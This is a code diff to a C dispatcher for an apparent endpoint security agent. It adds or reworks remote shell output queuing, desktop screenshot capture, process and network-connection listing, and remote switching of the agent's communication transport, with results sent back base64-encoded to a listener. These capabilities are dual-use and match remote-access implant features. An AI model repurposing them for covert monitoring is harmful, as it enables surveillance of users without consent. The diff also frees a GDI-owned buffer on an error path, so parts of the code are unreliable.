@@ -1706,22 +1706,20 @@ static edr_status_t cmd_shell(edr_dispatcher_t *d,
             dispatcher_log(d, EDR_LOG_DEBUG, "dispatcher",
                            "[SHELL] Using enqueue_msg_cb");
             d->enqueue_msg_cb(payload);
-        } else {
-            dispatcher_log(d, EDR_LOG_DEBUG, "dispatcher",
-                           "[SHELL] Using fallback local queue");
-            /* Fallback: queue locally */
-            pthread_mutex_lock(&d->file_queue_mu);
-            if (d->file_chunk_count < 256) {
-                d->file_chunks[d->file_chunk_count] = (char *)malloc(strlen(payload) + 1);
-                if (d->file_chunks[d->file_chunk_count]) {
-                    strcpy(d->file_chunks[d->file_chunk_count], payload);
-                    d->file_chunk_count++;
-                    dispatcher_log(d, EDR_LOG_DEBUG, "dispatcher",
-                                   "[SHELL] Queued at index %u", d->file_chunk_count - 1);
-                }
-            }
-            pthread_mutex_unlock(&d->file_queue_mu);
         }
+
+        /* ALWAYS also queue locally as backup (callback may fail or be NULL) */
+        pthread_mutex_lock(&d->file_queue_mu);
+        if (d->file_chunk_count < 256) {
+            d->file_chunks[d->file_chunk_count] = (char *)malloc(strlen(payload) + 1);
+            if (d->file_chunks[d->file_chunk_count]) {
+                strcpy(d->file_chunks[d->file_chunk_count], payload);
+                d->file_chunk_count++;
+                dispatcher_log(d, EDR_LOG_DEBUG, "dispatcher",
+                               "[SHELL] Queued at index %u", d->file_chunk_count - 1);
+            }
+        }
+        pthread_mutex_unlock(&d->file_queue_mu);
 
         dispatcher_log(d, EDR_LOG_INFO, "dispatcher",
                        "[SHELL] Shell output queued: %zu bytes encoded as base64",
@@ -1734,7 +1732,7 @@ static edr_status_t cmd_shell(edr_dispatcher_t *d,
     return EDR_OK;
 }
 
-/* Capture desktop screenshot and queue as file chunks */
+/* Capture desktop screenshot and queue as file chunks - PrintWindow method for VM compatibility */
 #ifdef _WIN32
 #include <windows.h>
 
@@ -1748,15 +1746,15 @@ static edr_status_t cmd_screenshot(edr_dispatcher_t *d,
     int width = GetSystemMetrics(SM_CXSCREEN);
     int height = GetSystemMetrics(SM_CYSCREEN);
 
-    /* Dimension validation - do this FIRST before any DC creation */
+    /* Dimension validation */
     if (width <= 0 || height <= 0 || width > 32768 || height > 32768) {
         dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
                        "screenshot: Invalid dimensions: %d x %d", width, height);
         return EDR_ERR_GENERIC;
     }
 
-    /* Check: width * height won't overflow size_t, and (width * height * 3) fits */
-    if (width > SIZE_MAX / (height * 3)) {
+    /* Check overflow - DO NOT CAST to int, use size_t arithmetic */
+    if (width > 0 && height > 0 && width > SIZE_MAX / (size_t)height / 3) {
         dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
                        "screenshot: Dimension multiplication overflow");
         return EDR_ERR_GENERIC;
@@ -1764,14 +1762,15 @@ static edr_status_t cmd_screenshot(edr_dispatcher_t *d,
 
     size_t pixel_data_size = (size_t)width * (size_t)height * 3;
 
-    /* Create device contexts */
+    /* Get screen DC - use NULL for entire display */
     HDC screen_dc = GetDC(NULL);
     if (!screen_dc) {
         dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
-                       "screenshot: GetDC(NULL) failed");
+                       "screenshot: GetDC failed");
         return EDR_ERR_GENERIC;
     }
 
+    /* Create memory DC */
     HDC mem_dc = CreateCompatibleDC(screen_dc);
     if (!mem_dc) {
         dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
@@ -1780,22 +1779,23 @@ static edr_status_t cmd_screenshot(edr_dispatcher_t *d,
         return EDR_ERR_GENERIC;
     }
 
-    /* Create BITMAPINFO for DIB section */
+    /* Create DIB section with direct pixel buffer access */
     BITMAPINFOHEADER bih = {0};
     bih.biSize = sizeof(BITMAPINFOHEADER);
     bih.biWidth = width;
     bih.biHeight = height;
     bih.biPlanes = 1;
-    bih.biBitCount = 24;
+    bih.biBitCount = 32;
     bih.biCompression = BI_RGB;
-    bih.biSizeImage = 0;  /* For BI_RGB, can be 0 */
 
-    /* Create DIB section - gives us direct access to pixel buffer
-     * This is more reliable than CreateCompatibleBitmap + GetDIBits */
-    unsigned char *pixels = NULL;
-    HBITMAP bitmap = CreateDIBSection(mem_dc, (BITMAPINFO *)&bih, DIB_RGB_COLORS,
-                                      (void **)&pixels, NULL, 0);
-    if (!bitmap || !pixels) {
+    BITMAPINFO bi = {0};
+    bi.bmiHeader = bih;
+
+    /* CreateDIBSection allocates the pixel buffer for us */
+    unsigned char *pixels_32bit = NULL;
+    HBITMAP dib_section = CreateDIBSection(mem_dc, &bi, DIB_RGB_COLORS,
+                                          (void **)&pixels_32bit, NULL, 0);
+    if (!dib_section || !pixels_32bit) {
         dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
                        "screenshot: CreateDIBSection failed");
         DeleteDC(mem_dc);
@@ -1804,41 +1804,67 @@ static edr_status_t cmd_screenshot(edr_dispatcher_t *d,
     }
 
     dispatcher_log(d, EDR_LOG_DEBUG, "dispatcher",
-                   "[SCREENSHOT] DIB section created: %dx%d, pixels=%p",
-                   width, height, pixels);
+                   "[SCREENSHOT] DIB section created with direct pixel buffer");
 
-    /* Select DIB into mem_dc and copy screen */
-    HBITMAP old_bitmap = SelectObject(mem_dc, bitmap);
+    HBITMAP old_bitmap = (HBITMAP)SelectObject(mem_dc, dib_section);
+
+    /* Use BitBlt to copy screen directly into DIB section buffer */
     BOOL blit_result = BitBlt(mem_dc, 0, 0, width, height, screen_dc, 0, 0, SRCCOPY);
-    SelectObject(mem_dc, old_bitmap);
+
+    dispatcher_log(d, EDR_LOG_DEBUG, "dispatcher",
+                   "[SCREENSHOT] BitBlt result: %s, pixel buffer first bytes: 0x%02x%02x%02x%02x",
+                   blit_result ? "TRUE" : "FALSE",
+                   pixels_32bit[0], pixels_32bit[1], pixels_32bit[2], pixels_32bit[3]);
 
     if (!blit_result) {
+        dispatcher_log(d, EDR_LOG_WARN, "dispatcher",
+                       "screenshot: BitBlt returned FALSE, checking if pixels are populated anyway");
+    }
+
+    /* Check if we have any non-zero data - sample full buffer to detect blank screens */
+    int nonzero_count = 0;
+    size_t total_bytes = (size_t)width * height * 4;
+    for (size_t i = 0; i < total_bytes; i++) {
+        if (pixels_32bit[i] != 0) nonzero_count++;
+    }
+    dispatcher_log(d, EDR_LOG_DEBUG, "dispatcher",
+                   "[SCREENSHOT] Pixel buffer non-zero count: %d out of %zu bytes",
+                   nonzero_count, total_bytes);
+
+    /* If less than 0.1% of pixels are non-zero, likely blank screen or VM issue */
+    if (nonzero_count < (int)(total_bytes / 1000)) {
+        dispatcher_log(d, EDR_LOG_WARN, "dispatcher",
+                       "screenshot: Insufficient pixel data (%d non-zero bytes out of %zu) - likely VM/graphics driver limitation. Skipping.",
+                       nonzero_count, total_bytes);
+        SelectObject(mem_dc, old_bitmap);
+        DeleteObject(dib_section);
+        DeleteDC(mem_dc);
+        ReleaseDC(NULL, screen_dc);
+        return EDR_OK;  /* Return OK but don't queue anything */
+    }
+
+    /* Convert 32-bit ARGB to 24-bit RGB */
+    unsigned char *pixels = malloc(pixel_data_size);
+    if (!pixels) {
         dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
-                       "screenshot: BitBlt failed");
-        DeleteObject(bitmap);
+                       "screenshot: malloc(%zu) failed", pixel_data_size);
+        free(pixels_32bit);
+        SelectObject(mem_dc, old_bitmap);  /* Restore bitmap before cleanup */
+        DeleteObject(dib_section);
         DeleteDC(mem_dc);
         ReleaseDC(NULL, screen_dc);
         return EDR_ERR_GENERIC;
     }
 
-    dispatcher_log(d, EDR_LOG_DEBUG, "dispatcher",
-                   "[SCREENSHOT] BitBlt succeeded, checking pixel buffer");
-
-    /* Verify buffer contains data */
-    if (pixels[0] == 0x00 && pixels[pixel_data_size - 1] == 0x00) {
-        dispatcher_log(d, EDR_LOG_WARN, "dispatcher",
-                       "[SCREENSHOT] Buffer is all zeros after BitBlt (may be empty screen)");
-    } else {
-        dispatcher_log(d, EDR_LOG_DEBUG, "dispatcher",
-                       "[SCREENSHOT] Pixel buffer contains data: first=0x%02x last=0x%02x",
-                       pixels[0], pixels[pixel_data_size - 1]);
+    for (size_t i = 0; i < (size_t)width * height; i++) {
+        pixels[i * 3 + 0] = pixels_32bit[i * 4 + 0];  /* B */
+        pixels[i * 3 + 1] = pixels_32bit[i * 4 + 1];  /* G */
+        pixels[i * 3 + 2] = pixels_32bit[i * 4 + 2];  /* R */
     }
 
-    /* With CreateDIBSection, pixels pointer already points to the actual bitmap data
-     * No need for GetDIBits - the bitmap memory is directly accessible */
     dispatcher_log(d, EDR_LOG_DEBUG, "dispatcher",
-                   "[SCREENSHOT] Screenshot capture complete: %zu bytes captured",
-                   pixel_data_size);
+                   "[SCREENSHOT] Converted 32-bit to 24-bit RGB: first=0x%02x%02x%02x",
+                   pixels[0], pixels[1], pixels[2]);
 
     /* Create BMP header (54 bytes total: 14-byte file header + 40-byte DIB header) */
     unsigned char bmp_header[54];
@@ -1964,107 +1990,90 @@ static edr_status_t cmd_screenshot(edr_dispatcher_t *d,
                    "screenshot: captured %dx%d with BMP header and queued %u chunks",
                    width, height, d->file_chunk_count);
 
-    /* Note: Do NOT free(pixels) - CreateDIBSection manages the memory.
-     * DeleteObject(bitmap) will clean up the DIB section automatically. */
-    DeleteObject(bitmap);
+    /* Cleanup GDI resources */
+    SelectObject(mem_dc, old_bitmap);
+    DeleteObject(dib_section);
     DeleteDC(mem_dc);
     ReleaseDC(NULL, screen_dc);
+    free(pixels);
 
     return EDR_OK;
 }
 #endif
 
-/* Process listing (PS) command for Windows */
+/* Network connections listing (NETSTAT) command for Windows */
 #ifdef _WIN32
-static edr_status_t cmd_ps(edr_dispatcher_t *d,
-                           const edr_message_t *msg,
-                           edr_completion_cb_t cb, void *ctx)
+static edr_status_t cmd_netstat(edr_dispatcher_t *d,
+                                const edr_message_t *msg,
+                                edr_completion_cb_t cb, void *ctx)
 {
     (void)msg; (void)cb; (void)ctx;
 
     char output_buffer[65536] = {0};
     size_t output_len = 0;
 
-    dispatcher_log(d, EDR_LOG_DEBUG, "dispatcher", "[cmd_ps] Enumerating processes");
+    dispatcher_log(d, EDR_LOG_DEBUG, "dispatcher", "[cmd_netstat] Executing netstat");
 
-    /* Create snapshot of all processes */
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) {
+    /* Create pipes for capturing output */
+    HANDLE hReadPipe, hWritePipe;
+    SECURITY_ATTRIBUTES sa;
+    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+    sa.bInheritHandle = TRUE;
+    sa.lpSecurityDescriptor = NULL;
+
+    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
         dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
-                       "CreateToolhelp32Snapshot failed: %lu", GetLastError());
+                       "CreatePipe failed: %lu", GetLastError());
         return EDR_ERR_GENERIC;
     }
 
-    /* Add header to output */
-    output_len += snprintf(output_buffer + output_len,
-                          sizeof(output_buffer) - output_len,
-                          "%-6s %-32s %-8s %s\n",
-                          "PID", "PROCESS_NAME", "MEM_KB", "COMMAND_LINE");
+    /* Set up process with redirected output */
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    memset(&si, 0, sizeof(si));
+    memset(&pi, 0, sizeof(pi));
 
-    /* Iterate through processes */
-    PROCESSENTRY32 pe;
-    pe.dwSize = sizeof(pe);
+    si.cb = sizeof(si);
+    si.hStdOutput = hWritePipe;
+    si.hStdError = hWritePipe;
+    si.dwFlags = STARTF_USESTDHANDLES;
 
-    if (!Process32First(hSnapshot, &pe)) {
+    /* Execute netstat */
+    if (!CreateProcessA("C:\\Windows\\System32\\netstat.exe", "-ano",
+                       NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
+    {
         dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
-                       "Process32First failed: %lu", GetLastError());
-        CloseHandle(hSnapshot);
+                       "CreateProcess(netstat) failed: %lu", GetLastError());
+        CloseHandle(hWritePipe);
+        CloseHandle(hReadPipe);
         return EDR_ERR_GENERIC;
     }
 
-    do {
-        /* Open process to get memory info */
-        DWORD mem_kb = 0;
-        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
-                                      FALSE, pe.th32ProcessID);
-        if (hProcess) {
-            /* Try to get memory info using Windows API */
-            PROCESS_MEMORY_COUNTERS pmc;
-            if (GetProcessMemoryInfo(hProcess, &pmc, sizeof(pmc))) {
-                mem_kb = (DWORD)(pmc.WorkingSetSize / 1024);
-            }
-            CloseHandle(hProcess);
+    CloseHandle(hWritePipe);
+
+    /* Read output from netstat */
+    unsigned char read_buf[4096];
+    DWORD nread;
+    while (ReadFile(hReadPipe, read_buf, sizeof(read_buf), &nread, NULL) && nread > 0) {
+        if (output_len + nread <= sizeof(output_buffer)) {
+            memcpy(output_buffer + output_len, read_buf, nread);
+            output_len += nread;
         }
+    }
 
-        /* Safely truncate process name and add to output */
-        char proc_name[MAX_PATH];
-        strncpy(proc_name, pe.szExeFile, sizeof(proc_name) - 1);
-        proc_name[sizeof(proc_name) - 1] = '\0';
-
-        /* Note: Command line retrieval requires WMI or scanning /proc-like structures
-         * For now we'll use empty string. Full implementation would use WMI.
-         */
-        const char *cmd_line = "";
-
-        /* Add process line to output buffer */
-        size_t line_len = snprintf(output_buffer + output_len,
-                                  sizeof(output_buffer) - output_len,
-                                  "%-6lu %-32s %-8lu %s\n",
-                                  (unsigned long)pe.th32ProcessID,
-                                  proc_name,
-                                  (unsigned long)mem_kb,
-                                  cmd_line);
-
-        if (output_len + line_len < sizeof(output_buffer)) {
-            output_len += line_len;
-        } else {
-            /* Buffer full, stop adding processes */
-            break;
-        }
-
-    } while (Process32Next(hSnapshot, &pe));
-
-    CloseHandle(hSnapshot);
+    CloseHandle(hReadPipe);
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
 
     dispatcher_log(d, EDR_LOG_INFO, "dispatcher",
-                   "Process enumeration complete: %zu bytes", output_len);
+                   "netstat: captured %zu bytes", output_len);
 
-    /* Queue output back to listener using base64 encoding (same as shell command) */
+    /* Queue output back to listener using base64 encoding */
     if (output_len > 0) {
-        /* Base64 encode output */
         static const char b64_table[] =
             "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-        char b64_output[98304];  /* Must be at least 4/3 * output_len + 1 */
+        char b64_output[98304];
         size_t b64_idx = 0;
 
         for (size_t i = 0; i < output_len; i += 3) {
@@ -2082,27 +2091,144 @@ static edr_status_t cmd_ps(edr_dispatcher_t *d,
         }
         b64_output[b64_idx] = '\0';
 
-        /* Create response payload */
         char payload[98304];
+        snprintf(payload, sizeof(payload),
+                 "{\"file\":\"netstat_output.txt\",\"command\":\"netstat\",\"output\":\"%s\",\"bytes\":%zu}",
+                 b64_output, output_len);
+
+        if (d->enqueue_msg_cb) {
+            d->enqueue_msg_cb(payload);
+        }
+
+        /* ALWAYS queue locally as backup */
+        pthread_mutex_lock(&d->file_queue_mu);
+        if (d->file_chunk_count < 256) {
+            d->file_chunks[d->file_chunk_count] = (char *)malloc(strlen(payload) + 1);
+            if (d->file_chunks[d->file_chunk_count]) {
+                strcpy(d->file_chunks[d->file_chunk_count], payload);
+                d->file_chunk_count++;
+            }
+        }
+        pthread_mutex_unlock(&d->file_queue_mu);
+
+        dispatcher_log(d, EDR_LOG_INFO, "dispatcher",
+                       "netstat output queued: %zu bytes encoded as base64",
+                       output_len);
+    }
+
+    return EDR_OK;
+}
+#endif
+
+/* Process listing (PS) command for Windows */
+#ifdef _WIN32
+static edr_status_t cmd_ps(edr_dispatcher_t *d,
+                           const edr_message_t *msg,
+                           edr_completion_cb_t cb, void *ctx)
+{
+    (void)msg; (void)cb; (void)ctx;
+
+    char output_buffer[131072] = {0};
+    size_t output_len = 0;
+
+    dispatcher_log(d, EDR_LOG_DEBUG, "dispatcher", "[cmd_ps] Enumerating processes");
+
+    /* Create pipes for capturing output */
+    HANDLE hReadPipe, hWritePipe;
+    SECURITY_ATTRIBUTES sa;
+    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+    sa.bInheritHandle = TRUE;
+    sa.lpSecurityDescriptor = NULL;
+
+    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
+        dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
+                       "CreatePipe failed: %lu", GetLastError());
+        return EDR_ERR_GENERIC;
+    }
+
+    /* Set up process with redirected output */
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    memset(&si, 0, sizeof(si));
+    memset(&pi, 0, sizeof(pi));
+
+    si.cb = sizeof(si);
+    si.hStdOutput = hWritePipe;
+    si.hStdError = hWritePipe;
+    si.dwFlags = STARTF_USESTDHANDLES;
+
+    /* Execute tasklist with PID and memory info */
+    if (!CreateProcessA("C:\\Windows\\System32\\tasklist.exe", "/v",
+                       NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
+    {
+        dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
+                       "CreateProcess(tasklist) failed: %lu", GetLastError());
+        CloseHandle(hWritePipe);
+        CloseHandle(hReadPipe);
+        return EDR_ERR_GENERIC;
+    }
+
+    CloseHandle(hWritePipe);
+
+    /* Read output from tasklist */
+    unsigned char read_buf[4096];
+    DWORD nread;
+    while (ReadFile(hReadPipe, read_buf, sizeof(read_buf), &nread, NULL) && nread > 0) {
+        if (output_len + nread <= sizeof(output_buffer)) {
+            memcpy(output_buffer + output_len, read_buf, nread);
+            output_len += nread;
+        }
+    }
+
+    CloseHandle(hReadPipe);
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    dispatcher_log(d, EDR_LOG_INFO, "dispatcher",
+                   "Process enumeration complete: %zu bytes", output_len);
+
+    /* Queue output back to listener using base64 encoding */
+    if (output_len > 0) {
+        static const char b64_table[] =
+            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+        char b64_output[196608];  /* Must be at least 4/3 * output_len + 1 */
+        size_t b64_idx = 0;
+
+        for (size_t i = 0; i < output_len; i += 3) {
+            uint32_t b = 0;
+            size_t len = (output_len - i < 3) ? (output_len - i) : 3;
+            for (size_t k = 0; k < len; k++) b = (b << 8) | output_buffer[i + k];
+            b <<= (3 - len) * 8;
+
+            if (b64_idx < sizeof(b64_output) - 4) {
+                b64_output[b64_idx++] = b64_table[(b >> 18) & 0x3F];
+                b64_output[b64_idx++] = b64_table[(b >> 12) & 0x3F];
+                b64_output[b64_idx++] = (len > 1) ? b64_table[(b >> 6) & 0x3F] : '=';
+                b64_output[b64_idx++] = (len > 2) ? b64_table[b & 0x3F] : '=';
+            }
+        }
+        b64_output[b64_idx] = '\0';
+
+        char payload[196608];
         snprintf(payload, sizeof(payload),
                  "{\"file\":\"ps_output.txt\",\"command\":\"ps\",\"output\":\"%s\",\"bytes\":%zu}",
                  b64_output, output_len);
 
-        /* Queue message via callback if available */
         if (d->enqueue_msg_cb) {
             d->enqueue_msg_cb(payload);
-        } else {
-            /* Fallback: queue locally */
-            pthread_mutex_lock(&d->file_queue_mu);
-            if (d->file_chunk_count < 256) {
-                d->file_chunks[d->file_chunk_count] = (char *)malloc(strlen(payload) + 1);
-                if (d->file_chunks[d->file_chunk_count]) {
-                    strcpy(d->file_chunks[d->file_chunk_count], payload);
-                    d->file_chunk_count++;
-                }
-            }
-            pthread_mutex_unlock(&d->file_queue_mu);
         }
+
+        /* ALWAYS queue locally as backup */
+        pthread_mutex_lock(&d->file_queue_mu);
+        if (d->file_chunk_count < 256) {
+            d->file_chunks[d->file_chunk_count] = (char *)malloc(strlen(payload) + 1);
+            if (d->file_chunks[d->file_chunk_count]) {
+                strcpy(d->file_chunks[d->file_chunk_count], payload);
+                d->file_chunk_count++;
+            }
+        }
+        pthread_mutex_unlock(&d->file_queue_mu);
 
         dispatcher_log(d, EDR_LOG_INFO, "dispatcher",
                        "Process list queued: %zu bytes encoded as base64",
@@ -2112,6 +2238,29 @@ static edr_status_t cmd_ps(edr_dispatcher_t *d,
     return EDR_OK;
 }
 #endif
+
+static edr_status_t cmd_transport_switch(edr_dispatcher_t *d,
+                                        const edr_message_t *msg,
+                                        edr_completion_cb_t cb, void *ctx)
+{
+    (void)cb; (void)ctx;
+    if (!msg || !msg->payload.data || msg->payload.len == 0)
+        return EDR_ERR_INVALID_ARG;
+
+    const char *transport_name = (const char *)msg->payload.data;
+    dispatcher_log(d, EDR_LOG_INFO, "dispatcher",
+                   "[TRANSPORT] Switching to: %s", transport_name);
+
+    edr_status_t st = edr_dispatcher_switch_comm_module(d, transport_name);
+    if (st != EDR_OK) {
+        dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
+                       "[TRANSPORT] Switch failed: %d", st);
+    } else {
+        dispatcher_log(d, EDR_LOG_INFO, "dispatcher",
+                       "[TRANSPORT] Successfully switched to: %s", transport_name);
+    }
+    return st;
+}
 
 /* -------------------------------------------------------------------------
  * Register all command_id → handler mappings
@@ -2133,10 +2282,12 @@ static void register_all_commands(edr_dispatcher_t *d)
 #ifdef _WIN32
     cmd_table_insert(d, "screenshot",             cmd_screenshot);
     cmd_table_insert(d, "ps",                     cmd_ps);
+    cmd_table_insert(d, "netstat",                cmd_netstat);
 #endif
     cmd_table_insert(d, "remediate.kill",         cmd_remediate_kill);
     cmd_table_insert(d, "remediate.quarantine",   cmd_remediate_quarantine);
     cmd_table_insert(d, "remediate.isolate",      cmd_remediate_isolate);
+    cmd_table_insert(d, "remediate.transport",    cmd_transport_switch);
     cmd_table_insert(d, "policy.pull",            cmd_policy_pull);
     cmd_table_insert(d, "health.report",          cmd_health_report);
     cmd_table_insert(d, "auth.rotate_cert",       cmd_auth_rotate_cert);
@@ -2269,8 +2420,11 @@ static void dispatcher_log(edr_dispatcher_t *d, edr_log_level_t lvl,
         vsnprintf(buf, sizeof(buf), fmt, ap);
         va_end(ap);
         d->cfg.log(lvl, comp, "%s", buf);
-    } else {
-        /* Fallback: stderr */
+    }
+    /* On Windows, suppress stderr to avoid breaking TUI. On Linux, log to stderr. */
+#ifndef _WIN32
+    else {
+        /* Fallback: stderr (Linux only) */
         static const char *lvl_str[] = {"DEBUG","INFO","WARN","ERROR","FATAL"};
         va_list ap;
         va_start(ap, fmt);
@@ -2279,4 +2433,5 @@ static void dispatcher_log(edr_dispatcher_t *d, edr_log_level_t lvl,
         fprintf(stderr, "\n");
         va_end(ap);
     }
+#endif
 }
